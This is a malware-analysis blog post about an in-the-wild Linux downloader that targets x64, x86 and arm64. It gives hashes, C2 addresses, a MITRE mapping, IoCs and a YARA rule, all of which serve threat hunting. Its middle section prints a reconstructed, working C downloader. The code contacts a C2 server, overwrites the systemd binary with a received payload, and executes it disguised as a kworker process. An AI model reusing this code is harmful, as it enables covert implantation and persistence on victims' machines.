---
title:  "An In The Wild Linux Threat"
date:   2024-08-18
draft: false
categories: ["YouGotReversed"]
tags: ["reverse-engineer", "malware-analysis"]
---


## Key Finds

- We investigate an in-the-wild Linux threat used as a downloader for a second payload (which we couldn't put our hands on);
- This thread targets three common architectures:
  - x64
  - x86
  - arm64
- This thread tries to overwrite the systemd utility to maintain its persistence on the victim;
- We assume that to execute successfully, this malware needs root privilege;

## Introduction

Days ago, I saw an interesting post on [X by @Huntio](https://x.com/Huntio/status/1823280152845107543) about an opendir found at IP address `106[.14.176.]208`, with some suspicious ELF files communicating with this address at port `7744`. Also, in the same tweet, [@abuse_ch mentioned](https://x.com/i/bookmarks?post_id=1823322611754918332) that this IP has been seen hosting a Cobalt Strike server on ports `80` and `4444`.

{{< figure
    src="imgs/img00.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

I decided to investigate those finds and see if we could spot some lights in something more. The tweet also shared two SHA1 hashes of the ELF files found on the server.

- amd64 - [7b276653c3e09010c4ec0afe3f44859ec1f5d65d](https://www.virustotal.com/gui/file/facafec4183ca19a003b941f3c668917a3b5ab891e7c939d1e6fc37692416942)
- linux_i386 - [3fd87c6e3d681d7f7909902899e1bce6c5095cf5](https://www.virustotal.com/gui/file/4c0ace878616b963dd6ed320ace24309eaeacfc143255d1639d83130a244719c)

At the time of writing, both files are being detected by `8/68` AV engines, which is a very low detection rate for this threat. We need to consider the relevance of this threat that targets two common architectures: 32-bit and 64-bit.

{{< figure
    src="imgs/img01.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

{{< figure
    src="imgs/img02.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

After downloading those samples, we took them to our lab environment and started to dig into them.
**Obs:** the 64-bit version has been labeled as a downloader.

## Spotting Lights Into The Shadow Of Linux Binary

Like most AV engines and other malware analysts, I'm unfamiliar with Linux malware. Well, who can blame us? For a long time, most malware was Windows-based, and that’s where you'll put most of your efforts. But it is no secret for us that this threat landscape has changed recently.

Today, in this post, I want to share some of my analysis processes for Linux binary and how common techniques are employed on Linux-based malware.

Let us start by performing a basic triage on those files.

{{< figure
    src="imgs/img03.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

As we can see above, our investigation got easier because our samples were *not stripped*, which helped us recover the original function and data names.

We also use CAPA to help us understand the capabilities employed by this malware. However, unlike the Windows result, many false positives were returned to us. That is why we cannot trust 100% on our tools.

{{< figure
    src="imgs/img04.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

The capabilities highlighted were the ones that we could spot based on our reversing (moreover). Other results are probably from the library functions statically linked in the binary.

Taking the binary to IDA, the main function is very simple based on its size.

{{< figure
    src="imgs/img05.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

{{< figure
    src="imgs/img06.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

The decompiler code from IDA shows us how extremely simple this malware is. It starts at block (1) by initializing a socket communication over TCP [[T1095](https://attack.mitre.org/techniques/T1095/)] with the desired address and port [[T1095](https://attack.mitre.org/techniques/T1571/)]. After that, it tries to connect to its C2.

Moving forward, at block (2), it tries to open the `systemd` binary with write mode. This is a legitimate binary on the Linux operation system used as a system and service manager, and malware authors commonly abuse it as a persistence mechanism [[T1543.002](https://attack.mitre.org/techniques/T1543/002/)]. If it succeeds in opening up the file, it will use the `chmod` function to change its permission [[T1222.002](https://attack.mitre.org/techniques/T1222/002/)] with the value `448`, which represents `rwx------` (owner can read, write, and execute; no permissions for group or others). We assume that this malware needs to run with root privileges to perform such action on a target system.

At block (3), the malware returns to its C2, the architecture, and the IP on which it is running. Below is a list of architecture targeted by this sample:

- For x64 architecture, the string `l64` is sent back;
- For x86 architecture, the string `l32` is sent back;
- For arm64 architecture, the string `a64` is sent back (more on that in *Pivoting ITW* section);

In block (4), the malware receives a second payload (which we couldn’t put our hands on) and overwrites the `systemd` binary. To finish, it executes the new malicious `systemd` by calling the `execvp` function.

To better understand how this sample behaves, I patched the binary's IP address to point to my lab address. Then, I executed it with sudo privileges using the command `strace`. I also wrote a simple “Hello, world” program to understand the entire execution. Below, we can find the execution results:

{{< figure
    src="imgs/img07.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

{{< figure
    src="imgs/img08.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

After digging into this sample, I came across this code representation. **Obs:** This was based on my reverse engineering skills; it is not the original source code.

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/stat.h>

int main(int argc, const char **argv, const char **envp)
{
    int sock;
    FILE* file;
    struct sockaddr_in addr;
    struct timeval timeout;
    char* bin_systemd = "/usr/sbin/systemd ";
    ssize_t recved_data;
    char buffer[4096];
    char * str_kworker = "[kworker/0:2]";

    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    if (sock < 0)
        return 1;

    timeout.tv_sec = 10;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(7744);

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0)
    {
        close(sock);
        return 2;
    }

    file = fopen(bin_systemd, "w");
    if (!file)
    {
        bin_systemd = "./systemd";
        file = fopen(bin_systemd, "w");
        if (!file)
        {
            close(sock);
            return 3;
        }
    }
    chmod(bin_systemd, S_IRWXU);
    
    // arch = l64 | l32 | a64
    const char* arch = "l64";
    send(sock, arch, strlen(arch), 0);
    send(sock, &addr.sin_addr.s_addr, sizeof(addr.sin_addr.s_addr), 0);

    while ( 1 )
    {
        recved_data = recv(sock, &buffer, sizeof(buffer), 0);
        if (recved_data <= 0)
            break;
        fwrite(&buffer, 1, recved_data, file);
    }

    fclose(file);
    close(sock);

    char *const worker[] = {bin_systemd, str_kworker, NULL};
    execvp(bin_systemd, worker);
    return 0;
}
```

## Pivoting ITW

Back to our first IP address from the tweet, we try pivoting to other related artifacts to see if we can name this threat.

{{< figure
    src="imgs/img09.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

By the time of writing, `16/93` vendors had been attributing this IP as malicious. Looking into the relations tab, we observe that this IP also hosts an arm64 version of this threat, but this version doesn’t communicate with this IP.

{{< figure
    src="imgs/img10.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

It’s interesting to observe the **0 detection** on the same malware but compiled to a different architecture. The relations tab to this sample tells us that its C2 address is `111[.111.111.]111`

{{< figure
    src="imgs/img11.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

I downloaded the sample and took it to my lab to confirm that. Sample:

- linux_arm64 -  [12cbba0f00dbf73ce66ed33e115dee2e9a25add2](https://www.virustotal.com/gui/file/4ffb3e6bc0a5d1067d06d61c2461cfeb44093a931f8488729c4731665ed4e358/details)

{{< figure
    src="imgs/img12.png"
    alt="Biohazard"
    figclass="text-center"
    class="mx-auto"
>}}

As we can see, this sample indeed communicates with this IP at port `55555`. I've tried to reach out to this address, but it is down by now.

## Conclusion

Besides, we couldn’t attribute a name to this threat; we can affirm that its presence and relevance are important when examining it for similar malicious behavior. Some good hunting opportunities:

- Hunting for TCP communication on non-standard ports performed by suspicious binaries + new elf files written on disk;
- Hunting for non-system processes creates a new `systemd` process.

## Mitre ATT&CK

| Tactic | Technique  | Description |
| --- | --- | --- |
| Persistence | Create or Modify System Process: Systemd Service | We observe that this malware tries to overwrite the systemd utility to maintain its persistence over the target. |
| Defense Evasion | File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification | The malware tries to change the permission of the systemd binary. |
| Command and Control | Non-Application Layer Protocol | The malware set up a socket to communicate with its C2 server. |
| Command and Control | Non-Standard Port | We observe this malware family communicating on ports 7744 and 55555. |

## IoC Table

| IOCs |
| --- |
| 106[.14.176.]208:7744 |
| 111[.111.111.]111:55555 |
| 7b276653c3e09010c4ec0afe3f44859ec1f5d65d - x64 |
| 3fd87c6e3d681d7f7909902899e1bce6c5095cf5 - x86 |
| 12cbba0f00dbf73ce66ed33e115dee2e9a25add2 - arm64 |

## Rule

```c
rule Linux_Downloader {
    meta:
        author = "@P4nd3m1cb0y"
        description = "Detects a Linux downloader targeting x64, x86, and arm64 architectures."
        date = "2024-08-18"
        reference = "https://x.com/Huntio/status/1823280152845107543"
        hash = "3fd87c6e3d681d7f7909902899e1bce6c5095cf5" // x86 version
        hash = "7b276653c3e09010c4ec0afe3f44859ec1f5d65d" // x64 version
        hash = "12cbba0f00dbf73ce66ed33e115dee2e9a25add2" // arm64 version

    strings:
        $s1 = "/usr/sbin/systemd" ascii
        $s2 = "./systemd" ascii
        $s3 = "[kworker/0:2]" ascii
        $arch1 = "l64" ascii
        $arch2 = "l32" ascii
        $arch3 = "a64" ascii 

        $sock_x64 = { BA 00 00 00 00 BE 01 00 00 00 BF 02 00 00 00 E8 ?? ?? ?? ?? }
        /*
            BA 00 00 00 00  mov     edx, IPPROTO_IP
            BE 01 00 00 00  mov     esi, SOCK_STREAM
            BF 02 00 00 00  mov     edi, AF_INET
            E8 ?? ?? ?? ??  call    socket
        */

        $sock_x86 = { 6A 00 6A 01 6A 02 E8 ?? ?? ?? }
        /*
            6A 00           push    0
            6A 01           push    1
            6A 02           push    2
            E8 ?? ?? ??     call    socket
        */

        $sock_arm64 = { 02 00 80 52 21 00 80 52 40 00 80 52 ?? 69 00 94 }
        /*
            02 00 80 52     mov        w2,#0x0
            21 00 80 52     mov        w1,#0x1
            40 00 80 52     mov        w0,#0x2
            ?? 69 00 94     bl         socket
        */

    condition:
        uint32(0) == 0x464C457F and
        filesize < 1MB and
        (3 of ($s*) and 1 of ($sock*) and 1 of ($arch*))
}

```
